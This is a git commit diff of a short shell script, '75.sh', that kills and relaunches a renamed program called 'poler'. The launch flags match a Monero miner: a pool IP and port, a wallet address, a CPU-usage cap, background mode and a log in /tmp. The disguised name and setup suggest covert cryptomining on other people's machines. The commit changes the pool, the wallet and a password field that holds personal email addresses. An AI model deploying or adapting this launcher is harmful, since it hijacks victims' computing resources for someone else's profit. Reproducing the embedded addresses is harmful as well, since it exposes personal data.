2309091a0b3e1bd58a65233b31dbbf3620ca3127
burkabest <52100051+burkabest@users.noreply.github.com>
2019-10-21 21:14:18 -0400

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 8 -o 94.103.87.132:5923-u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY  --pass=w5-serdce-krasavicy:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 74 --cpu-priority 3 -o 206.189.197.78:5520 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6  --pass=w9-serdce-krasavitsy:ivanovandrey1984g@gmail.com -k
